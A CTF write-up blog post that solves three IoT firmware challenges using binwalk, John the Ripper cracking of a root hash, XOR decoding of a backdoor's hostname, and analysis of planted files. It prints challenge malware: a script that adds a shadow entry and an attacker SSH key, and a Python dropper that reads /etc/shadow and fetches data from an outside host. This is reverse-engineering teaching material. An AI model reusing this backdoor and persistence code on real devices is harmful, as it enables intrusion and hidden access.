---
title: 'Wormcon 0x01: Firm 1,2,3'
date: 2021-08-29T00:00:00+00:00
author: Kris
layout: post
image: /images/2021/wormcon/firmtitle.png
categories:
  - Write-Ups
  - IOT
  - Firmware
---
Busy weekend with three simultaneous CTFs. I finished 19th over on this one so I feel like I should probably do at least one writeup. This is an unusual category for me, **Internet of Things** (IOT) which is a lot about firmware reverse engineering usually. Here's the three challenges I solved Firm1, Firm2, and Firm3 as they're all related.

#### <a name="firm1"></a>Firm 1 - IOT - 244 Points

This challenge reads:

```
Me and my time are trying to get the admin access of the gate but we are not able to get into it you have to find the secret password and what is the kernel version so that we can attack it.

Download

Flag format: wormcon{password_kernel-version}

Author : x3rz

(17 solves)
```

With the challenge we get this file:

* `Firm-1.bin 11mb (sha1:1abf9445028d2e22715425b7029a3b667102baad)`

This file I guess is the firmware from some IOT device, the `file` command confirms suspicions:

```shell
$ file Firm-1.bin 
Firm-1.bin: u-boot legacy uImage, jz_fw, Linux/MIPS, Firmware Image (Not compressed), 11075584 bytes, Sun Aug 15 01:39:11 2021, Load Address: 0x00000000, Entry Point: 0x00000000, Header CRC: 0x9871DE93, Data CRC: 0x2761E29D

```

A MIPS hardware device running Linux. Very common in the plethora of IOT devices out there. `Binwalk` is the go to tool here and I just go ahead and extract the entire thing.

```shell
# binwalk -e Firm-1.bin 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             uImage header, header size: 64 bytes, header CRC: 0x9871DE93, created: 2021-08-15 01:39:11, image size: 11075584 bytes, Data Address: 0x0, Entry Point: 0x0, data CRC: 0x2761E29D, OS: Linux, CPU: MIPS, image type: Firmware Image, compression type: none, image name: "jz_fw"
64            0x40            uImage header, header size: 64 bytes, header CRC: 0xD3B9E871, created: 2019-02-14 03:00:10, image size: 1859813 bytes, Data Address: 0x80010000, Entry Point: 0x80400630, data CRC: 0xE3786CEF, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: lzma, image name: "Linux-3.10.14"
128           0x80            LZMA compressed data, properties: 0x5D, dictionary size: 67108864 bytes, uncompressed size: -1 bytes
2097216       0x200040        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 3353388 bytes, 407 inodes, blocksize: 131072 bytes, created: 2021-08-15 01:35:08
5570624       0x550040        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 572594 bytes, 12 inodes, blocksize: 131072 bytes, created: 2018-08-13 04:50:58
6225984       0x5F0040        JFFS2 filesystem, little endian

```

We know from the clue that we need to get the `secret password` and the Kernel version. So I go directly for the root password in the SquashFS `/etc/` folder `shadow` file which does exist:

```shell
$ cd _Firm-1.bin.extracted
$ ls -la                                                                 
total 25004                                                               
drwxr-xr-x  5 root root        4096 Aug 29 22:48 .                       
drwxr-xr-x  5 root root        4096 Aug 29 22:48 ..                       
-rw-r--r--  1 root root     3353388 Aug 29 22:48 200040.squashfs         
-rw-r--r--  1 root root      572594 Aug 29 22:48 550040.squashfs
-rw-r--r--  1 root root     4849664 Aug 29 22:48 5F0040.jffs2
-rw-r--r--  1 root root     5728840 Aug 29 22:48 80
-rw-r--r--  1 root root    11075520 Aug 29 22:48 80.7z
drwxr-xr-x  3 root root        4096 Aug 29 22:48 jffs2-root
drwxrwxr-x 25 root root        4096 May  5  2019 squashfs-root
drwxr-xr-x  2  501 dialout     4096 Aug  2  2018 squashfs-root-0

$ ls -la squashfs-root/etc/shadow
-rw------- 1 root root 244 Aug 15 11:28 squashfs-root/etc/shadow

```

John the Ripper is able to crack the password with the `rockyou.txt` wordlist:

```shell
$ john -wordlist=/usr/share/wordlists/rockyou.txt squashfs-root/etc/shadow                                   Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

P@ssw0rd         (root)

1g 0:00:00:00 DONE (2021-08-29 22:54) 1.136g/s 9309p/s 9309c/s 9309C/s somebody..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

And as for the Kernel version, `binwalk` extracted the kernel for us earlier but didn't know what to do with it. Running `binwalk` one more time on the extracted kernel gives us part of the version number:

```shell
$ ls -la 80                                                                                                   
-rw-r--r-- 1 root root 5728840 Aug 29 22:48 80

$ binwalk 80                                                                                               

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
4173920       0x3FB060        Linux kernel version 3.10.1
4334978       0x422582        Unix path: /var/run/rpcbind.sock
4988120       0x4C1CD8        xz compressed data
5005292       0x4C5FEC        Unix path: /lib/firmware/updates/3.10.14
5301760       0x50E600        CRC32 polynomial table, little endian

```

But binwalk is not exactly right here, the minor version is wrong, `strings` and `grep` to the rescue:

```shell
$ strings 80 | grep 3.10
Linux version 3.10.14 (wuhx@ubuntu) (gcc version 4.7.2 (Ingenic r2.3.3 2016.12) ) #30 PREEMPT Thu Feb 14 11:00:04 CST 2019

```

Reading the clue, it asks for the flag format *wormcon{secret_version}* so we send `wormcon{P@ssw0rd_3.10.14}` which is accepted and were 1/3 completed.

#### <a name="firm2"></a>Firm2 - IOT - 436 Points

This challenge has almost no clues so I am apprehensive about trying it, we get:

```
Firm - 2
  
Download

Author : x3rz

(9 solves)
```

The file included is spookily similar to the first challenge but is different:

- `Firm-2.bin 11mb (sha1sum: 12ec84d984f3f8f3c86027468d18c23bcf465704)`

I decide to take a look anyway, I grab the file and do the same analysis as last time. It looks the same so far:

```shell
$ file Firm-2.bin                                                                                             
Firm-2.bin: u-boot legacy uImage, jz_fw, Linux/MIPS, Firmware Image (Not compressed), 11075584 bytes, Sat Aug 21 17:58:06 2021, Load Address: 0x00000000, Entry Point: 0x00000000, Header CRC: 0x7781795A, Data CRC: 0xA57FD553

$ binwalk -e Firm-2.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             uImage header, header size: 64 bytes, header CRC: 0x7781795A, created: 2021-08-21 17:58:06, image size: 11075584 bytes, Data Address: 0x0, Entry Point: 0x0, data CRC: 0xA57FD553, OS: Linux, CPU: MIPS, image type: Firmware Image, compression type: none, image name: "jz_fw"
64            0x40            uImage header, header size: 64 bytes, header CRC: 0xD3B9E871, created: 2019-02-14 03:00:10, image size: 1859813 bytes, Data Address: 0x80010000, Entry Point: 0x80400630, data CRC: 0xE3786CEF, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: lzma, image name: "Linux-3.10.14"
128           0x80            LZMA compressed data, properties: 0x5D, dictionary size: 67108864 bytes, uncompressed size: -1 bytes
2097216       0x200040        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 3360008 bytes, 409 inodes, blocksize: 131072 bytes, created: 2021-08-21 17:57:22
5570624       0x550040        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 572594 bytes, 12 inodes, blocksize: 131072 bytes, created: 2018-08-13 04:50:58
6225984       0x5F0040        JFFS2 filesystem, little endian

```

Since we have no clue, no guidance, I wonder what to do for a bit. Then I decided to use the similarity of the challenges against them. I compiled two file lists:

```shell
$ cd firm1/_Firm-1.bin.extracted/
$ find . > ../../f1.txt
$ cd ../../firm2/_Firm-2.bin.extracted/
$ find . > ../../f2.txt
$ cd ../..
$ diff f1.txt f2.txt                                                                                         331a332
> ./squashfs-root/etc/backdoor
407a409
> ./squashfs-root/usr/bin/b4cKD00R
```

Ah cool, this immediately found 2 new files in Firm2. A couple of backdoors?

```shell
 $ file firm2/_Firm-2.bin.extracted/squashfs-root/usr/bin/b4cKD00R 
firm2/_Firm-2.bin.extracted/squashfs-root/usr/bin/b4cKD00R: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3eb22d968e27e0001a6012b507d58e415b00f41c, for GNU/Linux 3.2.0, not stripped
```

An ELF binary backdoor, ok let's look in `Ghidra` to find out how it might work. We see the `main()` function sets up a socket after getting an destination address from this function I renamed `get_inet_addr().`

![Main function](/images/2021/wormcon/firm2_1.PNG)

The `get_inet_addr()`doesn't do much except pass a pointer to a const containing the bytes`39233b283b233c3d3522363e3c25267e3f7e3b313722`to the next function I renamed `decrypt()`.

![get_inet_addr function](/images/2021/wormcon/firm2_2.PNG)

`decrypt()` takes a constant key and XORs the ciphertext to presumably recover the plaintext. The key in this case being `0x50`. So presumably we should XOR the bytes bytes `39233b283b233c3d3522363e3c25267e3f7e3b313722` with `0x50` and receive a valid destination address string. I only get the string `iskxkslmerfnluv.o.kagr` though so I wonder where I went wrong and gave up on this binary for a moment. 

![decrypt func](/images/2021/wormcon/firm2_3.PNG)

Going back to the file diff, there were two files `backdoor` as well as the `b4cKD00R` we already looked at. Looking at that binary its much simpler. The main function stores the string constant directly and tries to call `inet_addr()` on it (which will surely fail) without decrypting it. The string in this case is different than before: `41405f4754475f45025a5940424a5e494d4702435e4b`. 

![backdoor main func](/images/2021/wormcon/firm2_4.PNG)

So I combined what I knew and tried to single byte XOR decrypt these bytes with the known key `0x50` but no luck. I tried a XOR brute force though and with the key `0x2c` found the address we needed: `mlskxksi.vulnfreak.org`

Combined with the port `80` we knew we were able to browse that url http://mlskxksi.vulnfreak.org and see the following:

`wormcon{1a73eb02b5af59138bfade4e4f2759f6}`

Part 2 down. On to Part 3...

#### <a name="firm3"></a>Firm3 - IOT - 436 Points

This challenge has almost no clues so I am apprehensive about trying it, we get:

```
Firm - 3
  
Download

Author : x3rz

(9 solves)
```

The file included is again similar to the first two challenges but is slightly different:

- `Firm-3.bin 11mb (sha1sum: 1126b265c2eded3fa3b963ec9f3665687c61fffe)`

I followed the same methodology:

1. Extract the files with `binwalk -e`
2. Compare the file listings with `Firm-1.bin`
3. Examine the diffs

In this case the diffs were:

```shell
$ binwalk -e Firm-3.bin
...
$ cd _Firm-3.bin.extracted/
$ find . > ../../f3.txt
$ cd ../..
$ diff f1.txt f3.txt 
92a93,96
> ./squashfs-root/root/flag.txt
> ./squashfs-root/root/ndfsdj
> ./squashfs-root/root/.ssh
> ./squashfs-root/root/.ssh/authorized_keys
228a233
> ./squashfs-root/bin/kill1
253a259
> ./squashfs-root/bin/.ps
312a319
> ./squashfs-root/tmp/2tz.sh
328a336
> ./squashfs-root/etc/mklashgs.py
461a470
> ./squashfs-root/usr/bin/pgrep1

```

Firstly, the `flag.txt` was a false flag so discounting that we have the following interesting things:

- `./squashfs-root/root/ndfsdj`
- `./squashfs-root/root/.ssh/authorized_keys`
- `./squashfs-root/bin/kill1`
- `./squashfs-root/bin/.ps`
- `./squashfs-root/tmp/2tz.sh`
- `./squashfs-root/etc/mklashgs.py`
- `./squashfs-root/usr/bin/pgrep1`

I looked at each of these files and started to piece together a scenario. I found that `/tmp/2tz.sh` has the following content:

```shell
echo "Re4ch3D 4n0tH3r L3v3L"

echo "ksldkln:$6$GsG9ub.tWUTPxonE$3vog70Pde1/VGczwALgpPUbsmeaVAzIdsjPfEqWzlfty72yl6HIsZt6bCWCHm/89+YjSYLCqFLAcTgtUO16NAJxKDOGOJHFjV-EOtp15_SD4=:18668:0:99999:7:::" >> /etc/shadow

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDx6t7h8TL8Ol+v6ERO1ywV5aD5XHElJ1KQdcWy5nz6t7PzAGjcuyp6zAZT2cEgzCLJZxT7fCmcrwUOgWjTlQYMH63DqodMBQp3ipfyM0POLrEv68epAIUyBfOFC/5upWiYu0uePc7S5uAgiWopW8ZCbogI81st5UG18EUeNNouFWrB52fuhO5nmRd96Bm3BV5naQm6CKfInqm1JK102cxH1Yv/Ni4Hu9WOcm+Om3OzLgT4q3a8Gtm8hP0xfs+xnYisUyXcl7WVvgOXKht5hGPoknvL+X3tKd6CX9SCMisjSQN9keuKWGJNVVBt+LJI63/y8lzR6V0AyKV6tOfFBWFakwJcaU4c1w5I8j7nr+BT0Wv7pr2Sryo49o5i8rKo6Ny8gFvRE+JZ7674xHQs/dL7yYZkT8r+fgWiMwYFqUaETiISAsZUqFFWA2Smn3Q4JNWIrU9HptSuPaZ17JXv9TkHAZx3Xa+vtrjvkhCUc4A6ExBChEbf4p0u5OPaf5phrFU= root@root" > /root/.authorized_keys

# To add File for dropper at /usr/bin/pgrep1
```

So its a shell script that adds the `authorized_keys`, and adds what could be mistaken for a user account to `/etc/shadow` but the hash does not resemble any hash, it looks more like urlencoded base64. This script mentions `/usr/bin/pgrep1` so that was my next target to look at.

The following is `pgrep1`

```python
from cryptography.fernet import Fernet
import requests
from bs4 import BeautifulSoup
nsalkd = ''

with open('/etc/shadow', 'r') as f:
    lnsdg = f.read().splitlines()
    lmnasdi = lnsdg[-1]
    nsalkd = lmnasdi


def hkmlsad(baskas):
        return baskas.split('.')
def sdjsl(sjcsl):
        return sjcsl[1].split(":")
def hslkcm(jslscs):
        return jslscs[1].split('+')
jkadskj = hkmlsad(nsalkd)
nuiusd = hslkcm(jkadskj)
nscdl = sdjsl(nuiusd)[0].encode()

xvcghe = ''

cvnfhf = "https://cdfdfxrgt.vulnfreak.org/jadsclkx"
mfghoys = requests.get(cvnfhf)
cdcsdcsd = BeautifulSoup(mfghoys.content, 'html.parser')
nsalkd = cdcsdcsd.encode()

pkmsdhy=Fernet(nscdl)
nmasdpod= pkmsdhy.encrypt(nsalkd)

bnlasde = open("/root/ndfsdj", "w")
bnlasde.write(f'{nmasdpod}')
bnlasde.close()

os.system('bash /bin/.ps')
```

This is somewhat obfuscated with nonsense variable names but what it essentially does is, reads `/etc/shadow` looking for the last line. Extracts a portion of the base64 encoded fake "hash" and uses that as an encryption key using the Python Fernet library. It then grabs some data from a website https://cdfdfxrgt.vulnfreak.org/jadsclkx and writes it to `/root/ndfsdj` encrypted with Fernet algorithm using the previously mentioned key.

If we look, the `/root/ndfsdj` file is still on the firmware image and we notice it looks a lot like a Fernet encrypted token:

```shell
$ cat firm3/_Firm-3.bin.extracted/squashfs-root/root/ndfsdj 
gAAAAABhIPksf_ALraPBo3d5_qTca5SEzOv2oB9LuXT78SWTNfMujG4sHG-5mO307ISlMgcHQ53iFNg4-mon0izS3wMd4dnWS3IoH7RFq01LmWALboyh2IeoSoZ99ySrP9Igi32gWb1_8KHfnhbpgOG9X8CU1VFggg==
```

If we follow the scripts logic, we can see that it is expecting to read the following line from `/etc/shadow` to recover the key:

```
ksldkln:$6$GsG9ub.tWUTPxonE$3vog70Pde1/VGczwALgpPUbsmeaVAzIdsjPfEqWzlfty72yl6HIsZt6bCWCHm/89+YjSYLCqFLAcTgtUO16NAJxKDOGOJHFjV-EOtp15_SD4=:18668:0:99999:7:::
```

Using part of the script, we can extract the key ourselves:

```python
import base64

shadow = "ksldkln:.tWUTPxonEvog70Pde1/VGczwALgpPUbsmeaVAzIdsjPfEqWzlfty72yl6HIsZt6bCWCHm/89+YjSYLCqFLAcTgtUO16NAJxKDOGOJHFjV-EOtp15_SD4=:18668:0:99999:7:::"

def split_on_dot(s):
        return s.split('.')

def split_element_1_on_colon(s):
        return s[1].split(":")

def split_element_1_on_plus(s):
        return s[1].split('+')

jkadskj = split_on_dot(shadow)
nuiusd = split_element_1_on_plus(jkadskj)
fernet_key = split_element_1_on_colon(nuiusd)[0].encode()

assert len(base64.urlsafe_b64decode(fernet_key)) == 32

print("fernet_key = %s" % fernet_key)

```

Which gives us the key:

```
$ python3 getkey.py
fernet_key = b'YjSYLCqFLAcTgtUO16NAJxKDOGOJHFjV-EOtp15_SD4='
                                                                                                            
```

We can then decrypt the `/root/ndfsdj` token with some more python:

```python
from cryptography.fernet import Fernet

fernet_key = b"YjSYLCqFLAcTgtUO16NAJxKDOGOJHFjV-EOtp15_SD4="
token = b"gAAAAABhIPksf_ALraPBo3d5_qTca5SEzOv2oB9LuXT78SWTNfMujG4sHG-5mO307ISlMgcHQ53iFNg4-mon0izS3wMd4dnWS3IoH7RFq01LmWALboyh2IeoSoZ99ySrP9Igi32gWb1_8KHfnhbpgOG9X8CU1VFggg=="
f=Fernet(fernet_key)
print(f.decrypt(token))
```

Which gives us:

```shell
$ python3 getflag.py 
b'wormcon{F1nd1nG_M3_1s_N0T_345Y!!!!!!!!!!!!!!!!!!!}'
```

Which wraps up the last of the Firm series of challenges.
